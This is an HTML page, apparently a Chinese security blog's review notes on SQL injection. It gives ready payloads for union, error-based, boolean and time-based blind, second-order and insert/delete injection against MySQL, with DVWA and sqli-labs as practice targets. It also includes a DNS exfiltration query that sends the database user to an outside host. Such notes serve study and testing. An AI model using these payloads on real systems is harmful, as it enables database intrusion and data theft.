@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-157457995-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  翻箱倒柜 —— SQL注入 &ndash; 春田花花幼稚园
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="SQL注入已经不比当年了？遇到就珍惜。本篇没有什么多的感悟，重新温习而已。
+|blog under go1f.cc">
+    
+
+    <meta name="apple-mobile-web-app-title" content="春田花花幼稚园">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+    <meta name="twitter:title" content="翻箱倒柜 —— SQL注入 | 春田花花幼稚园">
+    <meta name="twitter:description" content="SQL注入已经不比当年了？遇到就珍惜。本篇没有什么多的感悟，重新温习而已。|blog under go1f.cc">
+    <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="https://blog.go1f.cc/">
+    春田花花幼稚园
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/">
+      
+      <span>主页</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/notes/">
+      
+      <span>笔记</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/blog/">
+      
+      <span>博客</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">翻箱倒柜 —— SQL注入</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+<a href='/categories/web%E5%AE%89%E5%85%A8' class="muted-link">
+  <span class="Label Label--gray-darker">Web安全</span>
+</a>
+
+
+
+<a href='/tags/sql%E6%B3%A8%E5%85%A5' class="muted-link">
+  <span class="Label Label--gray">SQL注入</span>
+</a>
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2020-02-19. Published at: 2020-02-19.">
+        
+          Lastmod: 2020-02-19
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>SQL注入已经不比当年了？遇到就珍惜。本篇没有什么多的感悟，重新温习而已。</p>
+<p>​</p>
+<h2 id="注入的自我素养">注入的自我素养</h2>
+<p><strong>关键条件</strong></p>
+<ul>
+<li>用户可控</li>
+<li>后台执行</li>
+</ul>
+<p>​</p>
+<p><strong>参数类型</strong></p>
+<p>注入点数据类型分类</p>
+<p>​	整数型注入、字符型注入、搜索型注入</p>
+<p>注入点反馈分类</p>
+<p>​	union类型、错误显示、布尔类型、时间、其他类型</p>
+<p>注入点操作类型分类</p>
+<p>​	select注入、update注入、insert注入、delete注入</p>
+<p>​</p>
+<p><strong>字符拼接</strong></p>
+<pre><code>concat('a','b,'c') #将多列结果一列输出
+concat_ws('||','a','b,'c')
+group_concat()    #将多行数据一行输出
+</code></pre><p><strong>字符串截取</strong></p>
+<p><code>substr(string, n, m)</code> 从第<code>n(&gt;=1)</code>个字符到开始第 <code>m</code>个字符 =&gt;mysql、sql_server</p>
+<p><code>substring</code>     =&gt;mysql、Oracle、sql_server</p>
+<p><code>mid</code>    =&gt;mysql</p>
+<p><code>left()</code>、 <code>right()</code> 、<code>length(arg1)</code></p>
+<p><strong>编码</strong></p>
+<p><code>ascii(arg1)</code>  a-z    97-122</p>
+<p>URL编码 <code>% </code>=&gt; <code>%25</code> 、反引号=&gt; <code>%27</code> 、注释符<code>#</code>=&gt; <code>%23</code></p>
+<p>​</p>
+<h2 id="联合注入">联合注入</h2>
+<ol>
+<li>
+<p>判断是否有注入漏洞，识别注入点类型</p>
+<p>单引号 判断类型；</p>
+<p>AND 判断后台执行，注意闭合关系</p>
+</li>
+</ol>
+<pre><code>1' AND 1=1#
+1' AND 1=2#
+1' AND '1'='1
+1' AND '1'='2
+1' OR '1'='1
+1' OR '1'='1
+</code></pre><p>​	字符注入时 注意单引号闭合</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">#查询语句是字符型
+$sql=&#34;SELECT * FROM User WHERE username=&#39;&#34;+$name+&#34;&#39;limit 0,1&#34;;
+#payload:  ?id=1&#39; AND &#39;1&#39;=&#39;1
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">and</span> <span class="k">exists</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">)</span>
+</code></pre></div><ol start="2">
+<li>判断列数 <code>ORDER BY</code></li>
+</ol>
+<pre><code>1' order by 8
+</code></pre><ol start="3">
+<li>
+<p>UNION 语句   前后语句的列数相等</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span><span class="n">passwd</span> <span class="k">FROM</span> <span class="k">User</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">$name</span><span class="s1">&#39;</span> 
+<span class="k">UNION</span>
+<span class="k">SELECT</span> <span class="nf">version</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="k">database</span><span class="p">(</span><span class="p">)</span><span class="p">;</span>
+</code></pre></div><p><code>UNION</code>自带去重，使用<code>UNION ALL</code>去重</p>
+<p>判断数据显示点 ，屏蔽正常查询结果，使后面查询结果显示，例如使<code>id=-2</code></p>
+</li>
+<li>
+<p>收集信息</p>
+</li>
+</ol>
+<pre><code>version()
+database()
+user()
+</code></pre><ol start="5">
+<li>information_schema，获取其他数据库名（mysql5+支持）</li>
+</ol>
+<ul>
+<li>
+<p>获取库名<code>database()</code></p>
+</li>
+<li>
+<p><strong>information_schema</strong>
+mysql的元数据库，储存数据库的库/表/列/数据之间的关系、用户权限。</p>
+<ul>
+<li>
+<p>payload</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">database</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">schema_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span> <span class="o">-</span><span class="o">-</span><span class="o">+</span>
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>获取表名</p>
+<ul>
+<li>
+<p>information_schema.<strong>tables</strong></p>
+</li>
+<li>
+<p><strong>table_schema</strong>, <strong>table_name</strong></p>
+</li>
+<li>
+<p>查询语句</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">user</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span> 
+<span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">dvwa</span><span class="s2">&#34;</span> <span class="o">-</span><span class="o">-</span><span class="o">+</span>
+</code></pre></div></li>
+<li>
+<p>充分利用两个显示位</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span> <span class="n">table_schema</span><span class="p">,</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span> 
+<span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">table_schema</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">;</span>
+<span class="c1">#限制返回结果行数，LIMIT 1,3    即从第1行向下查3行
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>获取列名</p>
+<ul>
+<li>
+<p>库名.表名 information_schema.<strong>columns</strong></p>
+</li>
+<li>
+<p>列名 <strong>table_schema</strong>, <strong>table_name</strong>, <strong>column_name</strong></p>
+</li>
+<li>
+<p>查询语句</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">user</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">column_name</span><span class="p">)</span> 
+<span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">dvwa</span><span class="s2">&#34;</span> <span class="k">and</span> <span class="n">table_name</span><span class="o">=</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">users</span><span class="s2">&#34;</span> <span class="o">-</span><span class="o">-</span><span class="o">+</span>
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>获取用户数据</p>
+</li>
+<li>
+<p>破解数据</p>
+</li>
+<li>
+<p>提升权限</p>
+</li>
+<li>
+<p>内网渗透</p>
+</li>
+</ul>
+<p><strong>like 语句</strong></p>
+<p>前后通配符 <code>%xx%</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">$sql = &#34;select * from db where news like &#39;%&#34; + $search + &#34;%&#39; limit 0,5;&#34;
+</code></pre></div><p>​</p>
+<h2 id="报错注入">报错注入</h2>
+<p>利用错误回显（需<strong>开启mysql_error()函数</strong>），把语句执行结果捎带出来。</p>
+<p><strong>XPATH类型</strong></p>
+<p>只有32字符长度输出，可使用分割函数分割输出</p>
+<ul>
+<li>
+<p>extarctvalue(arg1,arg2)   MySQL5.1</p>
+<p>第一参数随意填，第二参数，使用字符<code>~</code>、<code>0x7e</code>拼接错误路径，使报错</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">and</span> <span class="p">(</span><span class="k">SELECT</span> <span class="nf">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="p">(</span><span class="k">SELECT</span> <span class="k">user</span><span class="p">(</span><span class="p">)</span><span class="p">)</span><span class="p">,</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">~</span><span class="s2">&#34;</span><span class="p">)</span><span class="p">)</span><span class="p">)</span><span class="o">-</span><span class="o">-</span><span class="o">+</span>
+</code></pre></div></li>
+<li>
+<p>updatexml(arg1,arg2,arg3)     MySQL5.1.5</p>
+<p>与上同理</p>
+<pre><code>SELECT updatexml(1,CONCAT(0x7e,(SELECT user())),1);
+</code></pre><div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">from</span> <span class="p">(</span><span class="k">SELECT</span> <span class="nf">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="k">user</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="nf">floor</span><span class="p">(</span><span class="nf">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span><span class="p">)</span><span class="n">x</span> 
+                    <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">SCHEMATA</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">x</span><span class="p">)</span><span class="n">k</span><span class="p">)</span><span class="o">-</span><span class="o">-</span><span class="o">+</span>
+</code></pre></div></li>
+</ul>
+<p>​</p>
+<p><strong>置错搭档</strong> floor()+group by+count()</p>
+<ul>
+<li>
+<p><code>floor(arg1)</code>取整     MySQL5.0+</p>
+</li>
+<li>
+<p><code>(SELECT XXX FROM THE_SCHEMA)New_table</code> 生成临时表格&quot;New_table&quot;以存储查询结果</p>
+<p>注意： MySQL 8.x 临时表会在本地创建，若无temp文件夹操作权限，语句无法执行。</p>
+<blockquote>
+<p>Can&rsquo;t write; duplicate key in table &lsquo;C:\Users\Ko\AppData\Local\Temp#sql3fd0_9_b&rsquo;</p>
+</blockquote>
+</li>
+<li>
+<p>payload</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">and</span> <span class="p">(</span><span class="k">SELECT</span> <span class="mi">1</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="nf">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="p">,</span>
+                    <span class="nf">CONCAT</span><span class="p">(</span><span class="p">(</span><span class="k">SELECT</span> <span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="p">,</span><span class="nf">floor</span><span class="p">(</span><span class="nf">RAND</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span><span class="p">)</span><span class="n">x</span> 
+                    <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">SCHEMATA</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">x</span><span class="p">)</span><span class="n">k</span><span class="p">)</span><span class="o">-</span><span class="o">-</span><span class="o">+</span>
+<span class="c1">#注意：CONCAT()内不要使用GROUP_CONCAT(),这个生成分组会掩盖x分组，令错误无法发生
+</span><span class="c1"></span><span class="c1">#注意：使用limit 0,1 避免多行结果
+</span></code></pre></div></li>
+</ul>
+<p><strong>整形溢出</strong>  mysql5.5.5+</p>
+<ul>
+<li>exp()</li>
+</ul>
+<p>​</p>
+<p><strong>重复列名</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="nf">NAME_CONST</span><span class="p">(</span><span class="nf">version</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="p">,</span><span class="nf">NAME_CONST</span><span class="p">(</span><span class="nf">version</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="p">)</span><span class="n">x</span><span class="p">;</span>
+</code></pre></div><p>​</p>
+<h2 id="布尔盲注">布尔盲注</h2>
+<p>页面有区分有<strong>正常</strong>与<strong>异常</strong>显示，使用 <code>and if or</code> 来判断语句是否正确</p>
+<p>确定字符串长度</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="nf">length</span><span class="p">(</span><span class="k">database</span><span class="p">(</span><span class="p">)</span><span class="p">)</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">8</span><span class="o">-</span><span class="o">-</span><span class="o">+</span>
+</code></pre></div><p>二分法逼近/或26字母爆破</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">and</span> <span class="nf">ascii</span><span class="p">(</span><span class="nf">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">97</span> <span class="o">-</span><span class="o">-</span><span class="o">+</span>
+<span class="k">and</span> <span class="nf">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">s</span><span class="s1">&#39;</span> <span class="o">-</span><span class="o">-</span><span class="o">+</span>
+</code></pre></div><p>​</p>
+<h3 id="时间盲注">时间盲注</h3>
+<p>当无论任何情况下，都有正常结果，则由返回页面时间判断 语句是否被执行</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">AND</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">-</span><span class="o">-</span><span class="o">+</span>
+</code></pre></div><p>结合布尔盲注，错误 睡眠5秒</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="k">if</span><span class="p">(</span><span class="nf">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">s</span><span class="s1">&#39;</span><span class="p">,</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="p">)</span><span class="o">-</span><span class="o">-</span><span class="o">+</span>
+</code></pre></div><p>​</p>
+<h3 id="dns渗出">DNS渗出</h3>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span> <span class="nf">LOAD_FILE</span><span class="p">(</span><span class="nf">CONCAT</span><span class="p">(</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">\\\\</span><span class="s1">&#39;</span><span class="p">,</span><span class="p">(</span><span class="k">SELECT</span> <span class="nf">hex</span><span class="p">(</span><span class="k">user</span><span class="p">(</span><span class="p">)</span><span class="p">)</span><span class="p">)</span><span class="p">,</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">.log.com\\aaa</span><span class="s1">&#39;</span><span class="p">)</span><span class="p">)</span><span class="p">;</span>
+</code></pre></div><p>​</p>
+<h2 id="不常见注入">不常见注入</h2>
+<h3 id="cookie一类注入">Cookie一类注入</h3>
+<p><strong>Cookie</strong>  BASE64注入(sqli-labs第20-21关)</p>
+<p>burpsuit的intruder的playload process的添加前缀、添加后缀、base64编码。</p>
+<p>​</p>
+<p><strong>更多</strong> (sqli-labs第18-20关)</p>
+<p><code>$_SERVER['HTTP_USER_AGENT']</code>、<code>$_SERVER[HTTP_X_FORWARD_FOR]</code></p>
+<p>​</p>
+<h3 id="堆叠注入">堆叠注入</h3>
+<p><code>mysql_query() </code>不支持多行查询</p>
+<p><code>mysqli_muti_query() </code>    <strong>mysqli</strong>支持多行查询</p>
+<p>​</p>
+<h3 id="二阶注入">二阶注入</h3>
+<p>创建一个恶意用户 admin&rsquo;#</p>
+<p>登录 select uname from users where username='admin&rsquo;#&rsquo; and password=&rsquo;';</p>
+<p>修改密码</p>
+<pre><code>select * from users where username='admin'#' and password=&quot;&quot;;
+update User set password=&quot;123&quot; where username='admin'#'
+update User set password=&quot;123&quot; where username=&quot;admin&quot;#&quot;
+update User set password=&quot;123&quot; where username=admin#
+</code></pre><p>​</p>
+<h3 id="操作注入">操作注入</h3>
+<p><strong>insert注入</strong></p>
+<p>拼接构造</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="c1">#报错
+</span><span class="c1"></span><span class="k">insert</span> <span class="k">into</span> <span class="nf">users</span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">2</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">insert_inject</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">test
+</span><span class="s1"></span><span class="s1">&#39;</span> <span class="k">or</span> <span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">(</span><span class="p">)</span><span class="p">)</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">or</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">    #payload
+</span><span class="s1"></span><span class="s1">&#39;</span><span class="p">)</span> <span class="p">;</span>
+<span class="c1">#插入数据
+</span><span class="c1"></span><span class="k">insert</span> <span class="k">into</span> <span class="nf">users</span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="n">username</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">2</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">password</span><span class="s1">&#39;</span><span class="p">,</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">0
+</span><span class="s1"></span><span class="s1">&#39;</span> <span class="k">or</span> <span class="p">(</span><span class="k">select</span> <span class="k">database</span><span class="p">(</span><span class="p">)</span><span class="p">)</span> <span class="k">or</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">1        #payload
+</span><span class="s1"></span><span class="s1">&#39;</span><span class="p">)</span><span class="p">;</span>
+</code></pre></div><p>更多闭合方法</p>
+<pre><code>' or (payload) and '
+'* (payload) *'
+' – (payload) – '
+</code></pre><p>​</p>
+<p><strong>update注入</strong></p>
+<p>同理</p>
+<p>​</p>
+<p><strong>delete注入</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">delete</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">inject
+</span><span class="s1"></span><span class="s1">&#39;</span> <span class="k">and</span> <span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">(</span><span class="p">)</span><span class="p">)</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">or</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">
+</span><span class="s1"></span><span class="s1">&#39;</span><span class="p">;</span>
+</code></pre></div><p>​</p>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>翻箱倒柜 —— SQL注入</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#注入的自我素养">注入的自我素养</a></li>
+    <li><a href="#联合注入">联合注入</a></li>
+    <li><a href="#报错注入">报错注入</a></li>
+    <li><a href="#布尔盲注">布尔盲注</a>
+      <ul>
+        <li><a href="#时间盲注">时间盲注</a></li>
+        <li><a href="#dns渗出">DNS渗出</a></li>
+      </ul>
+    </li>
+    <li><a href="#不常见注入">不常见注入</a>
+      <ul>
+        <li><a href="#cookie一类注入">Cookie一类注入</a></li>
+        <li><a href="#堆叠注入">堆叠注入</a></li>
+        <li><a href="#二阶注入">二阶注入</a></li>
+        <li><a href="#操作注入">操作注入</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+  
+
+  
+    
+    
+      <div>
+        
+
+        
+
+        
+
+        
+          <a data-pocket-label="pocket" data-pocket-count="none" class="pocket-btn" data-lang="en"></a>
+          <script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+        
+
+      </div>
+    
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    ©go1f 2020 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
